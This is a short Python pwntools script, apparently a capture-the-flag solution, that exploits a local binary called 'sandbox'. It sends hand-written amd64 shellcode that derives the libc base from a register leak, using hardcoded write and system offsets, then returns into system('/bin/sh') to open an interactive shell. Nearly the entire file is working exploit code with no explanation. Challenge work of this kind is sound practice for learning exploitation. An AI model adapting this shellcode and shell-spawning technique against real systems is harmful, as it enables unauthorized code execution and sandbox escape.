from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

script = """init-pwndbg
b 170
"""

# p = gdb.debug("./sandbox", gdbscript=script)

p = process("./sandbox")

syscall_monitor_offset = 0x1289
syscall_monitor = 0x555fd7aef289
write_got       = 0x555fd7af1f80

write_libc  = 0x0000000000101c10
system_libc = 0x000000000004ba40

binsh = 0x1bb26a

sc = asm(f"""
nop

mov rax, 123
syscall

mov rax, {write_libc + 23}
sub rcx, rax

mov rdi, {binsh}
add rdi, rcx

mov rax, {system_libc}
add rax, rcx

push 0
push rax
ret

nop
""")

p.send(sc)
p.interactive()
